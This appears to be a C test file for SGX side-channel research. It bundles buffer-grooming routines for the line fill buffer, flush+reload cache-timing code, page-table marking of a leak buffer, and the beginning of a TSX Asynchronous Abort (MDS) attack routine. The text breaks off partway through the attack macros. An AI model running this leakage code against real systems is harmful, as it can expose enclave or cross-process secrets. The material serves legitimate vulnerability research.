#include <criterion/criterion.h>

#pragma region /** libsgxanalyser */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

#include "enclyser/libenclyser/pt.h"

/** ===== libsgxanalyser/debug_utility.h ===== */
/*
#ifndef DEBUG_UTILITY

#define DEBUG_UTILITY

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

#define ASSERT(cond)                                                    \
    do {                                                                \
        if (!(cond))                                                    \
        {                                                               \
            perror("[" __FILE__ "] assertion '" #cond "' failed");      \
            abort();                                                    \
        }                                                               \
    } while(0)

#define INFO(msg, ...)                                                  \
    do {                                                                \
        printf("[" __FILE__ "] " msg "\n", ##__VA_ARGS__);              \
        fflush(stdout);                                                 \
    } while(0)

#endif
*/
/** ===== libsgxanalyser/sgxanalyser_defs.h ===== */

#ifndef SGXANALYSER_DEFS

#define SGXANALYSER_DEFS

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

/**
 * The size of a page, a L1 cacheline and the L1, L2, L3 cache.
 */
#define PAGE_SIZE 0x1000
#define CACHELINE_SIZE 0x40
#define L1D_CACHE_SIZE_PER_CORE (32 * 1024)
#define L1D_CACHE_STRIDE 0x1000

/**
 * Defs for buffergrooming_utility.
 */
#define GROOMING_BUFFER_SIZE (6144 * 2)

/**
 * Defs for enclave_utility.
 */
#define FAULT_BUFFER_SIZE (4096 * 2)

/**
 * Defs for attack_utility.
 */
#define LEAK_SOURCE_SIZE (4096 * 2)

/**
 * Defs for flushreload_utility.
 */
#ifndef RELOAD_SHIFT
#define RELOAD_SHIFT 6
#endif
#define RELOAD_SIZE (1 << RELOAD_SHIFT)
#define RELOAD_RESULT_LIMIT 256
#define RELOAD_BUFFER_SIZE (RELOAD_RESULT_LIMIT * RELOAD_SIZE)
#define RELOAD_RESULTS_SIZE (RELOAD_RESULT_LIMIT * sizeof(uint8_t))

/**
 * Defs for primeprobe_utility.
 */
#define PRIME_PROBE_BUFFER_SIZE (16 * 1024 * 1024)

/**
 * The times of mds repetitions.
 */
#define REPETITION_LIMIT 100

/**
 * A common setting for mmap() in sgx-analyser. 
 * See https://man7.org/linux/man-pages/man2/mmap.2.html for mmap() details.
 */
#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE)
#define MMAP_PROT (PROT_READ | PROT_WRITE)

/* ==================== ENUMS ==================== */

/**
 * ENUM MDS_ATTACK.
 */
#define ENUM_TAA 0
#define ENUM_MFBDS 1

/**
 * ENUM LEAK_SOURCE_PTE.
 */
#define ENUM_NORMAL 0
#define ENUM_NOT_ACCESSED 1
#define ENUM_NOT_PRESENT 2
#define ENUM_RSVD 3
#define ENUM_SUPERVISOR 4

/**
 * ENUM GROOMING_BUFFER_MEMTYPE.
 */
#define ENUM_WB 0
#define ENUM_WC 1

/**
 * ENUM BUFFER_GROOMING_INST.
 */
#define ENUM_EMPTY 0
#define ENUM_GP_LOAD 1
#define ENUM_GP_STORE 2
#define ENUM_NT_LOAD 3
#define ENUM_NT_STORE 4
#define ENUM_STR_LOAD 5
#define ENUM_STR_STORE 6

/**
 * ENUM BUFFER_GROOMING_POLICY.
 */
#define ENUM_OFFSET_INLINE 0
#define ENUM_LINE_NUM 1

/**
 * ENUM BUFFER_CLEARING.
 */
#define ENUM_NO_CLEAR 0
#define ENUM_VERW_CLEAR 1
#define ENUM_ORPD_CLEAR 2

/**
 * ENUM PMC_USAGE.
 */
#define NO_PMC 0
#define USE_PMC 1

/**
 * ENUM DOMAIN_SELECT
 */
#define USE_GENERAL 0
#define USE_SGX_EEXIT 1
#define USE_SGX_AEX 2
#define USE_SGX_COMBINED 3

/**
 * ENUM THREAD_MODEL
 */
#define ENUM_SINGLE_THREAD 0
#define ENUM_SINGLE_CORE 1
#define ENUM_DOUBLE_CORE 2

#endif

/** ===== libsgxanalyser/buffergrooming_trts.c ===== */

/**
 * The controlled grooming size, default to 6144.
 */
#ifndef TEST_GROOMING_SIZE
#define TEST_GROOMING_SIZE 6144
#define TEST_GROOMING_LINE (TEST_GROOMING_SIZE / 64)
#endif

/**
 * Flush the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer the grooming_buffer to be flushed.
 */
void flush_grooming_buffer(uint8_t *grooming_buffer)
{
    int i;

    for (i = 0; i < GROOMING_BUFFER_SIZE; i += CACHELINE_SIZE)
    {
        asm volatile(
            "clflush (%0)\n"
            :
            : "r"(grooming_buffer + i)
            :);
    }
    asm volatile("mfence\n");
}

#ifndef CMP_TEST_GROOMING_SIZE_R13
#define CMP_TEST_GROOMING_SIZE_R13 "cmp $" STR(TEST_GROOMING_SIZE) ", %%r13\n"
#endif

/**
 * Fill the line fill buffer with general purpose loads.
 * 
 * @param grooming_buffer the grooming_buffer to fill.
 */
void fill_lfb_gp_load(uint8_t *grooming_buffer)
{
    int i;

    flush_grooming_buffer(grooming_buffer);
    for (i = 0; i < TEST_GROOMING_SIZE; i += CACHELINE_SIZE)
    {
        asm volatile(
            "movzbq (%0), %%rax\n"
            :
            : "r"(grooming_buffer + i)
            : "rax");
    }
    asm volatile("mfence\n");
}

/**
 * Fill the line fill buffer with general purpose stores.
 * 
 * @param grooming_buffer the grooming_buffer to fill.
 */
void fill_lfb_gp_store(uint8_t *grooming_buffer)
{
    // int i;

    flush_grooming_buffer(grooming_buffer);
#if BUFFER_GROOMING_POLICY == ENUM_OFFSET_INLINE
    asm volatile(
        "xorq %%r13, %%r13\n"
        "3:" CMP_TEST_GROOMING_SIZE_R13
        "jae 4f\n"
        "movq $0x0807060504030201, %%r8\n"
        "movq $0x0808080808080808, %%r9\n"
        "xorq %%r12, %%r12\n"
        "1:cmp $0x8, %%r12\n"
        "jae 2f\n"
        "lea (%0, %%r13, 1), %%r10\n"
        "movq %%r8, (%%r10, %%r12, 8)\n"
        "addq %%r9, %%r8\n"
        "incq %%r12\n"
        "jmp 1b\n"
        "2:addq $0x40, %%r13\n"
        "jmp 3b\n"
        "4:mfence\n"
        :
        : "r"(grooming_buffer)
        : "r8", "r9", "r10", "r12", "r13");
#elif BUFFER_GROOMING_POLICY == ENUM_LINE_NUM
    asm volatile(
        "movq $0x0101010101010101, %%r8\n"
        "movq $0x0101010101010101, %%r9\n"
        "xorq %%r13, %%r13\n"
        "3:" CMP_TEST_GROOMING_SIZE_R13
        "jae 4f\n"
        "xorq %%r12, %%r12\n"
        "1:cmp $0x8, %%r12\n"
        "jae 2f\n"
        "lea (%0, %%r13, 1), %%r10\n"
        "movq %%r8, (%%r10, %%r12, 8)\n"
        "incq %%r12\n"
        "jmp 1b\n"
        "2:addq %%r9, %%r8\n"
        "addq $0x40, %%r13\n"
        "jmp 3b\n"
        "4:mfence\n"
        :
        : "r"(grooming_buffer)
        : "r8", "r9", "r10", "r12", "r13");
#endif
}

/**
 * Fill the line fill buffer with non-temporal loads.
 * 
 * @param grooming_buffer the grooming_buffer to fill.
 */
void fill_lfb_nt_load(uint8_t *grooming_buffer)
{
    int i;

    flush_grooming_buffer(grooming_buffer);
    for (i = 0; i < TEST_GROOMING_SIZE; i += CACHELINE_SIZE)
    {
        asm volatile(
            "movntdqa (%0), %%xmm0\n"
            :
            : "r"(grooming_buffer + i)
            : "xmm0");
    }
    asm volatile("mfence\n");
}

/**
 * Fill the line fill buffer with non-temporal stores.
 * 
 * @param grooming_buffer the grooming_buffer to fill.
 */
void fill_lfb_nt_store(uint8_t *grooming_buffer)
{
    // int i;

    flush_grooming_buffer(grooming_buffer);
#if BUFFER_GROOMING_POLICY == ENUM_OFFSET_INLINE
    asm volatile(
        "xorq %%r13, %%r13\n"
        "3:" CMP_TEST_GROOMING_SIZE_R13
        "jae 4f\n"
        "movq $0x0807060504030201, %%r8\n"
        "movq $0x0808080808080808, %%r9\n"
        "xorq %%r12, %%r12\n"
        "1:cmp $0x8, %%r12\n"
        "jae 2f\n"
        "lea (%0, %%r13, 1), %%r10\n"
        "movnti %%r8, (%%r10, %%r12, 8)\n"
        "addq %%r9, %%r8\n"
        "incq %%r12\n"
        "jmp 1b\n"
        "2:addq $0x40, %%r13\n"
        "jmp 3b\n"
        "4:mfence\n"
        :
        : "r"(grooming_buffer)
        : "r8", "r9", "r10", "r12", "r13");
#elif BUFFER_GROOMING_POLICY == ENUM_LINE_NUM
    asm volatile(
        "movq $0x0101010101010101, %%r8\n"
        "movq $0x0101010101010101, %%r9\n"
        "xorq %%r13, %%r13\n"
        "3:" CMP_TEST_GROOMING_SIZE_R13
        "jae 4f\n"
        "xorq %%r12, %%r12\n"
        "1:cmp $0x8, %%r12\n"
        "jae 2f\n"
        "lea (%0, %%r13, 1), %%r10\n"
        "movnti %%r8, (%%r10, %%r12, 8)\n"
        "incq %%r12\n"
        "jmp 1b\n"
        "2:addq %%r9, %%r8\n"
        "addq $0x40, %%r13\n"
        "jmp 3b\n"
        "4:mfence\n"
        :
        : "r"(grooming_buffer)
        : "r8", "r9", "r10", "r12", "r13");
#endif
}

#ifndef MOV_TEST_GROOMING_SIZE_ECX
#define MOV_TEST_GROOMING_SIZE_ECX "movq $" STR(TEST_GROOMING_SIZE) ", %%rcx\n"
#endif

/**
 * Fill the line fill buffer with string loads.
 * 
 * @param grooming_buffer the grooming_buffer to fill.
 */
void fill_lfb_str_load(uint8_t *grooming_buffer)
{
    flush_grooming_buffer(grooming_buffer);

    asm volatile(
        MOV_TEST_GROOMING_SIZE_ECX
        "rep lodsb\n"
        "mfence\n"
        : "+S"(grooming_buffer)
        :
        : "rax", "rcx");
}

/**
 * Fill the line fill buffer with string stores.
 * 
 * @param grooming_buffer the grooming_buffer to fill.
 */
void fill_lfb_str_store(uint8_t *grooming_buffer)
{
    flush_grooming_buffer(grooming_buffer);
#if BUFFER_GROOMING_POLICY == ENUM_OFFSET_INLINE
    asm volatile(
        "xorq %%r13, %%r13\n"
        "3:" CMP_TEST_GROOMING_SIZE_R13
        "jae 4f\n"
        "movq $0x0807060504030201, %%r8\n"
        "movq $0x0808080808080808, %%r9\n"
        "xorq %%r12, %%r12\n"
        "1:cmp $0x8, %%r12\n"
        "jae 2f\n"
        "movq %%r8, %%rax\n"
        "lea (%0, %%r13, 1), %%r10\n"
        "lea (%%r10, %%r12, 8), %%rdi\n"
        "stosq\n"
        "addq %%r9, %%r8\n"
        "incq %%r12\n"
        "jmp 1b\n"
        "2:addq $0x40, %%r13\n"
        "jmp 3b\n"
        "4:mfence\n"
        :
        : "r"(grooming_buffer)
        : "rax", "rdi", "r8", "r9", "r10", "r12", "r13");
#elif BUFFER_GROOMING_POLICY == ENUM_LINE_NUM
    asm volatile(
        "movq $0x0101010101010101, %%r8\n"
        "movq $0x0101010101010101, %%r9\n"
        "xorq %%r13, %%r13\n"
        "3:" CMP_TEST_GROOMING_SIZE_R13
        "jae 4f\n"
        "xorq %%r12, %%r12\n"
        "1:cmp $0x8, %%r12\n"
        "jae 2f\n"
        "movq %%r8, %%rax\n"
        "lea (%0, %%r13, 1), %%r10\n"
        "lea (%%r10, %%r12, 8), %%rdi\n"
        "stosq\n"
        "incq %%r12\n"
        "jmp 1b\n"
        "2:addq %%r9, %%r8\n"
        "addq $0x40, %%r13\n"
        "jmp 3b\n"
        "4:mfence\n"
        :
        : "r"(grooming_buffer)
        : "rax", "rdi", "r8", "r9", "r10", "r12", "r13");
#endif
}

/**
 * Flush the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to be flushed.
 */
void flush_grooming_buffer_1(uint8_t *grooming_buffer_1)
{
    flush_grooming_buffer(grooming_buffer_1);
}

/**
 * Fill the line fill buffer with general purpose loads.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to fill.
 */
void fill_lfb_gp_load_1(uint8_t *grooming_buffer_1)
{
    fill_lfb_gp_load(grooming_buffer_1);
}

/**
 * Fill the line fill buffer with general purpose stores.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to fill.
 */
void fill_lfb_gp_store_1(uint8_t *grooming_buffer_1)
{
    fill_lfb_gp_store(grooming_buffer_1);
}

/**
 * Fill the line fill buffer with non-temporal loads.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to fill.
 */
void fill_lfb_nt_load_1(uint8_t *grooming_buffer_1)
{
    fill_lfb_nt_load(grooming_buffer_1);
}

/**
 * Fill the line fill buffer with non-temporal stores.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to fill.
 */
void fill_lfb_nt_store_1(uint8_t *grooming_buffer_1)
{
    fill_lfb_nt_store(grooming_buffer_1);
}

/**
 * Fill the line fill buffer with string loads.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to fill.
 */
void fill_lfb_str_load_1(uint8_t *grooming_buffer_1)
{
    fill_lfb_str_load(grooming_buffer_1);
}

/**
 * Fill the line fill buffer with string stores.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to fill.
 */
void fill_lfb_str_store_1(uint8_t *grooming_buffer_1)
{
    fill_lfb_str_store(grooming_buffer_1);
}

/**
 * Flush the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to be flushed.
 */
void flush_grooming_buffer_2(uint8_t *grooming_buffer_2)
{
    flush_grooming_buffer(grooming_buffer_2);
}

/**
 * Fill the line fill buffer with general purpose loads.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to fill.
 */
void fill_lfb_gp_load_2(uint8_t *grooming_buffer_2)
{
    fill_lfb_gp_load(grooming_buffer_2);
}

/**
 * Fill the line fill buffer with general purpose stores.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to fill.
 */
void fill_lfb_gp_store_2(uint8_t *grooming_buffer_2)
{
    fill_lfb_gp_store(grooming_buffer_2);
}

/**
 * Fill the line fill buffer with non-temporal loads.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to fill.
 */
void fill_lfb_nt_load_2(uint8_t *grooming_buffer_2)
{
    fill_lfb_nt_load(grooming_buffer_2);
}

/**
 * Fill the line fill buffer with non-temporal stores.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to fill.
 */
void fill_lfb_nt_store_2(uint8_t *grooming_buffer_2)
{
    fill_lfb_nt_store(grooming_buffer_2);
}

/**
 * Fill the line fill buffer with string loads.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to fill.
 */
void fill_lfb_str_load_2(uint8_t *grooming_buffer_2)
{
    fill_lfb_str_load(grooming_buffer_2);
}

/**
 * Fill the line fill buffer with string stores.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to fill.
 */
void fill_lfb_str_store_2(uint8_t *grooming_buffer_2)
{
    fill_lfb_str_store(grooming_buffer_2);
}

/**
 * Clear lfb using VERW.
 */
void clear_lfb_verw(uint8_t *clear_buffer)
{
    /* TODO CPUID TEST FOR VERW SUPPORT */
    asm volatile("verw (%0)\n" ::"r"(clear_buffer));
}

/**
 * CLEAR lfb using orpd.
 */
void clear_lfb_orpd(uint8_t *clear_buffer)
{
    asm volatile(
        "orpd (%0), %%xmm0\n"
        "orpd (%0), %%xmm0\n"
        "mfence\n"
        :
        : "r"(clear_buffer)
        : "xmm0");
}

/** ====== libsgxanalyser/buffergrooming_utility.c ===== */

/**
 * The buffer required by buffer-grooming techniques.
 */
uint8_t *grooming_buffer;

/**
 * Malloc the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer the grooming_buffer to be malloced.
 */
void malloc_grooming_buffer(uint8_t **grooming_buffer)
{
    *grooming_buffer = (uint8_t *)mmap(NULL, GROOMING_BUFFER_SIZE, MMAP_PROT, MMAP_FLAGS, -1, 0);
    ASSERT(*grooming_buffer != MAP_FAILED);
}

/**
 * Free the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer the grooming_buffer to be freed.
 */
void free_grooming_buffer(uint8_t *grooming_buffer)
{
    ASSERT(!munmap(grooming_buffer, GROOMING_BUFFER_SIZE));
}

/* ==================== BUFFER_1 ==================== */

/**
 * The buffer required by buffer-grooming techniques.
 */
uint8_t *grooming_buffer_1;

/**
 * The pte used with page permission control.
 */
unsigned long *grooming_buffer_pte_1;

/**
 * Malloc the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to be malloced.
 */
void malloc_grooming_buffer_1(uint8_t **grooming_buffer_1)
{
    malloc_grooming_buffer(grooming_buffer_1);
}

/**
 * Free the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to be freed.
 */
void free_grooming_buffer_1(uint8_t *grooming_buffer_1)
{
    free_grooming_buffer(grooming_buffer_1);
}

/**
 * Mark the PTE of grooming_buffer_1 as the DEFINED_STATE.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to be marked.
 */
void mark_grooming_buffer_1(uint8_t *grooming_buffer_1)
{
    int i;

    for (i = 0; i < GROOMING_BUFFER_SIZE; i += PAGE_SIZE)
    {
#if FIRST_GROOMING_BUFFER_MEMTYPE == ENUM_WB
#elif FIRST_GROOMING_BUFFER_MEMTYPE == ENUM_WC
        grooming_buffer_pte_1 = (unsigned long *)remap_page_table_level(grooming_buffer_1 + i, PTE);
        *grooming_buffer_pte_1 = MARK_PAT1(*grooming_buffer_pte_1);
#endif
    }
}

/**
 * Assign the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_1 the grooming_buffer_1 to be assigned.
 */
void assign_grooming_buffer_1(uint8_t *grooming_buffer_1)
{
    int i;

    for (i = 0; i < GROOMING_BUFFER_SIZE; i++)
    {
#if BUFFER_GROOMING_POLICY == ENUM_OFFSET_INLINE
        grooming_buffer_1[i] = i % 0x40 + 1;
#elif BUFFER_GROOMING_POLICY == ENUM_LINE_NUM
        grooming_buffer_1[i] = i / 0x40 + 1;
#endif
    }
    asm volatile("mfence\n");
}

/**
 * The buffer required by buffer-grooming techniques.
 */
uint8_t *grooming_buffer_2;

/**
 * The pte used with page permission control.
 */
unsigned long *grooming_buffer_pte_2;

/**
 * Malloc the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to be malloced.
 */
void malloc_grooming_buffer_2(uint8_t **grooming_buffer_2)
{
    malloc_grooming_buffer(grooming_buffer_2);
}

/**
 * Free the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to be freed.
 */
void free_grooming_buffer_2(uint8_t *grooming_buffer_2)
{
    free_grooming_buffer(grooming_buffer_2);
}

/**
 * Mark the PTE of grooming_buffer_2 as the DEFINED_STATE.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to be marked.
 */
void mark_grooming_buffer_2(uint8_t *grooming_buffer_2)
{
    int i;

    for (i = 0; i < GROOMING_BUFFER_SIZE; i += PAGE_SIZE)
    {
#if SECOND_GROOMING_BUFFER_MEMTYPE == ENUM_WB
#elif SECOND_GROOMING_BUFFER_MEMTYPE == ENUM_WC
        grooming_buffer_pte_2 = (unsigned long *)remap_page_table_level(grooming_buffer_2 + i, PTE);
        *grooming_buffer_pte_2 = MARK_PAT1(*grooming_buffer_pte_2);
#endif
    }
}

/**
 * Assign the buffer required by buffer-grooming techniques.
 * 
 * @param grooming_buffer_2 the grooming_buffer_2 to be assigned.
 */
void assign_grooming_buffer_2(uint8_t *grooming_buffer_2)
{
    int i;

    for (i = 0; i < GROOMING_BUFFER_SIZE; i++)
    {
#if BUFFER_GROOMING_POLICY == ENUM_OFFSET_INLINE
        grooming_buffer_2[i] = i % 0x40 + 0x40 + 1;
#elif BUFFER_GROOMING_POLICY == ENUM_LINE_NUM
        grooming_buffer_2[i] = i / 0x40 + 0x80 + 1;
#endif
    }
    asm volatile("mfence\n");
}

/**
 * The buffer required by VERW MD-CLEAR techniques.
 */
unsigned char clear_buffer[64];

/** ===== libsgxanalyser/flushreload_utility.c ===== */

#define TIME_LIMIT 120

/**
 * The buffers required by flush-reload techniques.
 */
uint8_t *reload_buffer;
uint8_t *reload_results;

/**
 * Malloc buffers required by flush-reload techniques.
 * 
 * @param reload_buffer the reload_buffer to be malloced.
 * @param reload_results the reload_results to be malloced.
 */
void malloc_flush_reload_buffers(uint8_t **reload_buffer, uint8_t **reload_results)
{
    *reload_buffer = (uint8_t *)mmap(NULL, RELOAD_BUFFER_SIZE, MMAP_PROT, MMAP_FLAGS,
                                     -1, 0);
    ASSERT(*reload_buffer != MAP_FAILED);

    *reload_results = (uint8_t *)malloc(RELOAD_RESULTS_SIZE);
    ASSERT(*reload_results != NULL);

    memset(*reload_results, 0, RELOAD_RESULTS_SIZE);
}

/**
 * Free buffers required by flush-reload techniques.
 * 
 * @param reload_buffer the reload_buffer to be freed.
 * @param reload_results the reload_results to be freed.
 */
void free_flush_reload_buffers(uint8_t *reload_buffer, uint8_t *reload_results)
{
    ASSERT(!munmap(reload_buffer, RELOAD_BUFFER_SIZE));

    free(reload_results);
}

/**
 * Flush all lines of the reload_buffer. 
 * 
 * @param reload_buffer reload_buffer to be flushed.
 * 
 * @note This function requires the prefetcher to be disabled in advance 
 *     to work properly.
 */
void flush_reload_buffer(uint8_t *reload_buffer)
{
    int i;

    for (i = 0; i < RELOAD_BUFFER_SIZE; i += RELOAD_SIZE)
    {
        asm volatile("clflush (%0)\n" ::"r"(reload_buffer + i));
    }
    asm volatile("mfence\n");
}

/**
 * Get the time used to access the memory address, which indicates its location 
 * in the memory hierarchy.
 * 
 * @param address the memory address to be accessed.
 * @return the time used to access the memory address.
 * 
 * @see How to Benchmark Code Execution Times on Intel® IA-32 and IA-64 
 *     Instruction Set Architectures
 */
unsigned int access_time(unsigned long address)
{
    unsigned int cycles;

    asm volatile(
        "cpuid\n"
        "rdtsc\n"
        "movl %%eax, %0\n"
        "movq (%1), %%rax\n"
        "rdtscp\n"
        "subl %0, %%eax\n"
        "movl %%eax, %0\n"
        "cpuid\n"
        : "=r"(cycles), "+r"(address)
        :
        : "rax", "rbx", "rcx", "rdx");

    return cycles;
}

/**
 * A element of reload_results is incremented by 1 if its corresponding reload time is
 * below TIME_LIMIT.
 * 
 * @param reload_buffer the reload_buffer to be flushed.
 * @param reload_results the reload_results to be updated.
 * 
 * @note This function requires the prefetcher to be disabled in advance 
 *     to work properly.
 */
void reload_reload_buffer(uint8_t *reload_buffer, uint8_t *reload_results)
{
    int i;
    unsigned long dt;

    asm volatile("mfence\n");
    for (i = 0; i < RELOAD_BUFFER_SIZE; i += RELOAD_SIZE)
    {
        dt = access_time((unsigned long)(reload_buffer + i));
        if (dt < TIME_LIMIT)
        {
            reload_results[i / RELOAD_SIZE]++;
        }
    }
}

/**
 * Print a element of reload_results if it is larger than RECOVERY_RATE.
 * 
 * @param reload_results the reload_results to be printed.
 * 
 */
void print_reload_results(uint8_t *reload_results)
{
    int i;

    printf("{--------------------\n");
    for (i = 0; i < RELOAD_RESULT_LIMIT; i++)
    {
        if (reload_results[i] > 0)
        {
            printf("%08u: %02x (%c)\n", reload_results[i], (unsigned int)i,
                   isprint(i) ? (unsigned int)i : '?');
        }
    }
    printf("--------------------}\n\n");
}

/**
 * Reset all elements of reload_results for next round measurement.
 * 
 * @param reload_results reload_results to be reset.
 */
void reset_reload_results(uint8_t *reload_results)
{
    int i;

    for (i = 0; i < RELOAD_RESULT_LIMIT; i++)
    {
        reload_results[i] = 0;
    }
}

/** ===== libsgxanalyser/attack_utility/mdsattack_utility.c ===== */

/**
 * The value to be assigned.
 */
#define SOURCE_VALUE 0xff

/**
 * The variable used for repeated mds attack.
 */
int rep;

/**
 * The buffer and remapped buffer required by mds-attack techniques.
 */
uint8_t *leak_source;
uint8_t *leak_source_shadow;

/**
 * The pte used with page permission control.
 */
unsigned long *leak_source_pte;

/**
 * Malloc the buffer required by mds-attack techniques.
 * 
 * @param leak_source the leak_source to be malloced.
 */
void malloc_mds_attack_buffer(uint8_t **leak_source)
{
    *leak_source = (uint8_t *)mmap(NULL, LEAK_SOURCE_SIZE, MMAP_PROT, MMAP_FLAGS, -1, 0);
    if (*leak_source == MAP_FAILED)
    {
        printf("[sgx-analyser] mmap leak_source failed.\n");
        return;
    }
}

/**
 * Free the buffer required by mds-attack techniques.
 * 
 * @param leak_source the leak_source to be freed.
 */
void free_mds_attack_buffer(uint8_t *leak_source)
{
    if (munmap(leak_source, LEAK_SOURCE_SIZE) == -1)
    {
        printf("[sgx-analyser] munmap leak_source failed.\n");
        return;
    }
}

/**
 * Remap the buffer required by mds-attack techniques.
 */
void remap_mds_attack_buffer(uint8_t **leak_source_shadow, uint8_t *leak_source)
{
    *leak_source_shadow = (uint8_t *)remap_page_table_level(leak_source, PAGE);
}

/**
 * Assign the buffer required by mds-attack techniques.
 */
void assign_mds_attack_buffer(uint8_t *leak_source)
{
    int i;

    for (i = 0; i < PAGE_SIZE; i++)
    {
        leak_source[i] = SOURCE_VALUE;
    }
    asm volatile("mfence\n");
}

/**
 * Mark the PTE of leak_source as the DEFINED_STATE.
 * 
 * @param leak_source the leak_source to be marked.
 */
void mark_mds_attack_buffer(uint8_t *leak_source)
{
    int i;

    for (i = 0; i < LEAK_SOURCE_SIZE; i += PAGE_SIZE)
    {
#if LEAK_SOURCE_PTE == ENUM_NORMAL
#elif LEAK_SOURCE_PTE == ENUM_NOT_ACCESSED
        leak_source_pte = (unsigned long *)remap_page_table_level(leak_source + i, PTE);
        *leak_source_pte = MARK_NOT_ACCESSED(*leak_source_pte);
#elif LEAK_SOURCE_PTE == ENUM_NOT_PRESENT
        leak_source_pte = (unsigned long *)remap_page_table_level(leak_source + i, PTE);
        *leak_source_pte = MARK_NOT_PRESENT(*leak_source_pte);
#elif LEAK_SOURCE_PTE == ENUM_RSVD
        leak_source_pte = (unsigned long *)remap_page_table_level(leak_source + i, PTE);
        *leak_source_pte = MARK_RSVD(*leak_source_pte);
#elif LEAK_SOURCE_PTE == ENUM_SUPERVISOR
        leak_source_pte = (unsigned long *)remap_page_table_level(leak_source + i, PTE);
        *leak_source_pte = MARK_SUPERVISOR(*leak_source_pte);
#endif
    }
}

/**
 * Flush the buffer required by mds-attack techniques.
 */
void flush_mds_attack_buffer(uint8_t *leak_source)
{
    int i;

    for (i = 0; i < PAGE_SIZE; i += CACHELINE_SIZE)
    {
        asm volatile("clflush (%0)\n" ::"r"(leak_source + i));
    }
    asm volatile("mfence\n");
}

/** ===== libsgxanalyser/attack_utility/taa_attack.c ===== */

#define BASE_TAA taa_1ae694f7
#define INTER_TAA taa_e1a21680
#define ULT_TAA taa_7d05af71

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#ifndef CLFLUSH_ADDR_1_OFFSET
#define CLFLUSH_ADDR_1_OFFSET 0
#endif

#ifndef CLFLUSH_ADDR_2_OFFSET
#define CLFLUSH_ADDR_2_OFFSET 0
#endif

#ifndef EMPTY
#define EMPTY ""
#endif
#define CLFLUSH_ADDR_1 "clflush " STR(CLFLUSH_ADDR_1_OFFSET) "(%1)\n"
#define CLFLUSH_ADDR_2 "clflush " STR(CLFLUSH_ADDR_2_OFFSET) "(%2)\n"
#define LFENCE "lfence\n"
#define SFENCE "sfence\n"
#define MFENCE "mfence\n"

// INST_SLOT_0
#if FIRST_CLFLUSH_EMPTY
#define FIRST_CLFLUSH EMPTY
#elif FIRST_CLFLUSH_CLFLUSH_ADDR_1
#define FIRST_CLFLUSH CLFLUSH_ADDR_1
#elif FIRST_CLFLUSH_CLFLUSH_ADDR_2
#define FIRST_CLFLUSH CLFLUSH_ADDR_2
#else // DEFAULT
#define FIRST_CLFLUSH CLFLUSH_ADDR_2
#endif

// INST_SLOT_1
#if FIRST_FENCE_EMPTY
#define FIRST_FENCE EMPTY
#elif FIRST_FENCE_LFENCE
#define FIRST_FENCE LFENCE
#elif FIRST_FENCE_SFENCE
#define FIRST_FENCE SFENCE
#elif FIRST_FENCE_MFENCE
#define FIRST_FENCE MFENCE
#else // DEFAULT
#define FIRST_FENCE SFENCE
#endif

// INST_SLOT_2
#if SECOND_CLFLUSH_EMPTY
#define SECOND_CLFLUSH EMPTY
#elif SECOND_CLFLUSH_CLFLUSH_ADDR_1
#define SECOND_CLFLUSH CLFLUSH_ADDR_1
#elif SECOND_CLFLUSH_CLFLUSH_ADDR_2
#define SECOND_CLFLUSH CLFLUSH_ADDR_2
#else // DEFAULT
#define SECOND_CLFLUSH CLFLUSH_ADDR_1
#endif

// INST_SLOT_3
#if SECOND_FENCE_EMPTY
#define SECOND_FENCE EMPTY
#elif SECOND_FENCE_LFENCE
#define SECOND_FENCE LFENCE
#elif SECOND_FENCE_SFENCE
#define SECOND_FENCE SFENCE
#elif SECOND_FENCE_MFENCE
#define SECOND_FENCE MFENCE
#else // DEFAULT
#define SECOND_FENCE EMPTY
#endif

#define TAA_PREPERATION \
    "mfence\n" FIRST_CLFLUSH FIRST_FENCE SECOND_CLFLUSH SECOND_FENCE

#ifndef EMPTY
#define EMPTY ""
#endif
#define XABORT "xabort $0\n"
#define CPUID "cpuid\n"
#define PAUSE "pause\n"

#if ABORT_XABORT
#define ABORT XABORT
#elif ABORT_CPUID
#define ABORT CPUID
#elif ABORT_PAUSE
#define ABORT PAUSE
#else // DEFAULT
#define ABORT XABORT
#endif

#if ABORT_TIMES == 0
#define REP_ABORT EMPTY
#elif ABORT_TIMES == 1
#define REP_ABORT ABORT
#elif ABORT_TIMES == 2
#define REP_ABORT ABORT ABORT
#elif ABORT_TIMES == 3
#define REP_ABORT ABORT ABORT ABORT
#else // DEFAULT
#define REP_ABORT ABORT
#endif

#ifndef MOVZBQ_ADDR_0_OFFSET
#define MOVZBQ_ADDR_0_OFFSET 0
#endif

#define RELOAD_SHIFT 6

#define MOVZBQ_ADDR_0 "movzbq " STR(MOVZBQ_ADDR_0_OFFSET) "(%0), %%rax\n"
